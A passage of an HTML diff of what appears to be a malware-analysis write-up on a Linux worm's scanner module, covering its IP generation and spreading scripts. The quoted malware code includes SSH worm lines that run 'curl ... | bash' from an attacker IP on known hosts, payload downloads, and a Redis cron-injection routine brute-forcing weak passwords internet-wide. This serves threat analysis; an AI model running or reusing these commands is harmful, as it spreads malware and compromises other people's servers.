 executed and the malware checks for a count of &ldquo;2&rdquo; to be returned.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ps -auxf|grep networkservice|wc -l
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ps -auxf|grep networkservice|wc -l
 </code></pre></div><p>The scanner paths are:</p>
 <ul>
 <li><code>/etc/networkservice</code></li>
@@ -1050,7 +1047,7 @@ to be targeted:</p>
 <li>SQLServer</li>
 <li>ThinkPHP</li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Package _/tmp/0324/scan/exp: /tmp/0324/scan/exp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Package _/tmp/0324/scan/exp: /tmp/0324/scan/exp
 File: &lt;autogenerated&gt;	
 	init Lines: 1 to 1 (0)	
 File: cctv_exploit_wait.go	
@@ -1169,7 +1166,7 @@ below.</p>
 <p>The scanner generates random IP addresses by first generating a random number
 between 0 and 255. If the number is <em>127</em>, <em>10</em>, or <em>172</em>, it picks a new
 number. Otherwise,  three more numbers are generated.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e6c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0xff</span> <span style="color:#75715e">; 255
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e6c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">rsp</span>], <span style="color:#ae81ff">0xff</span> <span style="color:#75715e">; 255
 </span><span style="color:#75715e"></span><span style="color:#ae81ff">0x006b0e74</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.math_rand.Intn</span>
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e79</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_8h</span>]
 <span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x006b0e7e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">qword</span> [<span style="color:#66d9ef">var_38h</span>], <span style="color:#66d9ef">rax</span>
@@ -1192,7 +1189,7 @@ number. Otherwise,  three more numbers are generated.</p>
 </code></pre></div><p>The four numbers are used to create an IP string in <em>dot-decimal</em> notation
 using the <code>Sprintf</code> function from the <code>fmt</code> standard library package. The
 corresponding <em>Go</em> code would look something similar to the code below:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">for</span> {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">for</span> {
     <span style="color:#a6e22e">n1</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">rand</span>.<span style="color:#a6e22e">Intn</span>(<span style="color:#ae81ff">255</span>)
     <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">n1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">127</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">n1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">n1</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">172</span> {
         <span style="color:#66d9ef">continue</span>
@@ -1253,7 +1250,7 @@ version would spread was via known <em>ssh</em> host and stored keys. The code s
 below from an older version of the malware is showing this functionality. After
 this, the setup script would download the installation script for the scanner
 module.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -f /root/.ssh/known_hosts <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">[</span> -f /root/.ssh/id_rsa.pub <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -f /root/.ssh/known_hosts <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">[</span> -f /root/.ssh/id_rsa.pub <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
   <span style="color:#66d9ef">for</span> h in <span style="color:#66d9ef">$(</span>grep -oE <span style="color:#e6db74">&#34;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&#34;</span> /root/.ssh/known_hosts<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> ssh -oBatchMode<span style="color:#f92672">=</span>yes -oConnectTimeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> -oStrictHostKeyChecking<span style="color:#f92672">=</span>no $h <span style="color:#e6db74">&#39;curl -o-  http://178.157.91.26/ec8ce6ab/is.sh | bash &gt;/dev/null 2&gt;&amp;1 &amp;&#39;</span> &amp; <span style="color:#66d9ef">done</span>
 <span style="color:#66d9ef">fi</span>
 <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -f /root/.ssh/known_hosts <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">[</span> -f /root/.ssh/id_rsa.pub <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
@@ -1265,12 +1262,12 @@ $bbdira -fsSL http://178.157.91.26/ec8ce6ab/is.sh | bash
 </code></pre></div><p>The setup script would download two tools to scan for hosts: <em>masscan</em> and
 <em>pnscan</em>.  The snippet below downloads <em>masscan</em> that is stored in a
 tarball.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$bbdira -sL -o x1.tar.gz http://178.157.91.26/ec8ce6ab/1.0.4.tar.gz
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$bbdira -sL -o x1.tar.gz http://178.157.91.26/ec8ce6ab/1.0.4.tar.gz
 sleep <span style="color:#ae81ff">1</span>
 <span style="color:#f92672">[</span> -f x1.tar.gz <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> tar zxf x1.tar.gz <span style="color:#f92672">&amp;&amp;</span> cd masscan-1.0.4 <span style="color:#f92672">&amp;&amp;</span> make <span style="color:#f92672">&amp;&amp;</span> make install <span style="color:#f92672">&amp;&amp;</span> cd .. <span style="color:#f92672">&amp;&amp;</span> rm -rf masscan-1.0.4
 echo <span style="color:#e6db74">&#34;Masscan Installed&#34;</span>
 </code></pre></div><p>The tool <em>pnscan</em> is downloaded from the official <em>ftp</em> site, as can be seen below.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> ! <span style="color:#f92672">(</span> <span style="color:#f92672">[</span> -x /usr/local/bin/pnscan <span style="color:#f92672">]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[</span> -x /usr/bin/pnscan <span style="color:#f92672">]</span> <span style="color:#f92672">)</span>; <span style="color:#66d9ef">then</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#66d9ef">if</span> ! <span style="color:#f92672">(</span> <span style="color:#f92672">[</span> -x /usr/local/bin/pnscan <span style="color:#f92672">]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[</span> -x /usr/bin/pnscan <span style="color:#f92672">]</span> <span style="color:#f92672">)</span>; <span style="color:#66d9ef">then</span>
 $bbdira -kLs ftp://ftp.lysator.liu.se/pub/unix/pnscan/pnscan-1.11.tar.gz &gt; .x112 <span style="color:#f92672">||</span> $ccdira -q -O .x112 ftp://ftp.lysator.liu.se/pub/unix/pnscan/pnscan-1.11.tar.gz
 sleep <span style="color:#ae81ff">1</span>
 <span style="color:#f92672">[</span> -f .x112 <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> tar xf .x112<span style="color:#f92672">&amp;&amp;</span> cd pnscan-1.11 <span style="color:#f92672">&amp;&amp;</span> make lnx <span style="color:#f92672">&amp;&amp;</span> make install<span style="color:#f92672">&amp;&amp;</span> cd .. <span style="color:#f92672">&amp;&amp;</span> rm -rf pnscan-1.11 .x112
@@ -1278,11 +1275,11 @@ echo <span style="color:#e6db74">&#34;Pnscan Installed&#34;</span>
 <span style="color:#66d9ef">fi</span>
 </code></pre></div><p>After everything has been downloaded, the install script downloads the <em>redis</em>
 scanning logic.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$bbdir -fsSL http://178.157.91.26/ec8ce6ab/rs.sh | bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$bbdir -fsSL http://178.157.91.26/ec8ce6ab/rs.sh | bash
 $bbdira -fsSL http://178.157.91.26/ec8ce6ab/rs.sh | bash
 </code></pre></div><p>The <em>redis</em> scanning script first creates the payload. As can be seen below, it
 uses <em>cron</em> to gain code execution.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm -rf .dat .shard .ranges .lan 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm -rf .dat .shard .ranges .lan 2&gt;/dev/null
 sleep <span style="color:#ae81ff">1</span>
 echo <span style="color:#e6db74">&#39;config set dbfilename &#34;backup.db&#34;&#39;</span> &gt; .dat
 echo <span style="color:#e6db74">&#39;save&#39;</span> &gt;&gt; .dat
@@ -1299,7 +1296,7 @@ echo <span style="color:#e6db74">&#39;save&#39;</span> &gt;&gt; .dat
 </code></pre></div><p>The following code snippet is showing how <em>pnscan</em> is used to scan for <em>redis</em>
 servers. For any found services, it tries to authenticate with weak
 credentials.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">pnx<span style="color:#f92672">=</span>pnscan
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">pnx<span style="color:#f92672">=</span>pnscan
 <span style="color:#f92672">[</span> -x /usr/local/bin/pnscan <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> pnx<span style="color:#f92672">=</span>/usr/local/bin/pnscan
 <span style="color:#f92672">[</span> -x /usr/bin/pnscan <span style="color:#f92672">]</span> <span style="color:#f92672">&amp;&amp;</span> pnx<span style="color:#f92672">=</span>/usr/bin/pnscan
 <span style="color:#66d9ef">for</span> x in <span style="color:#66d9ef">$(</span> seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">224</span> | sort -R <span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
@@ -1319,7 +1316,7 @@ cat .dat | redis-cli -h $h -p $p -a <span style="color:#ae81ff">123456</span> --
 cat .dat | redis-cli -h $h -p $p -a admin --raw &amp;
 <span style="color:#66d9ef">done</span> &lt; .r.$x.$y.l
 </code></pre></div><p>The logic is similar for <em>masscan</em>:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">masscan --max-rate <span style="color:#ae81ff">10000</span> -p6379 --shard <span style="color:#66d9ef">$(</span> seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">22000</span> | sort -R | head -n1 <span style="color:#66d9ef">)</span>/22000 --exclude 255.255.255.255 0.0.0.0/0 2&gt;/dev/null | awk <span style="color:#e6db74">&#39;{print $6, substr($4, 1, length($4)-4)}&#39;</span> | sort | uniq &gt; .shard
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">masscan --max-rate <span style="color:#ae81ff">10000</span> -p6379 --shard <span style="color:#66d9ef">$(</span> seq <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">22000</span> | sort -R | head -n1 <span style="color:#66d9ef">)</span>/22000 --exclude 255.255.255.255 0.0.0.0/0 2&gt;/dev/null | awk <span style="color:#e6db74">&#39;{print $6, substr($4, 1, length($4)-4)}&#39;</span> | sort | uniq &gt; .shard
 sleep <span style="color:#ae81ff">1</span>
 <span style="color:#66d9ef">while</span> read -r h p; <span style="color:#66d9ef">do</span>
 cat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;
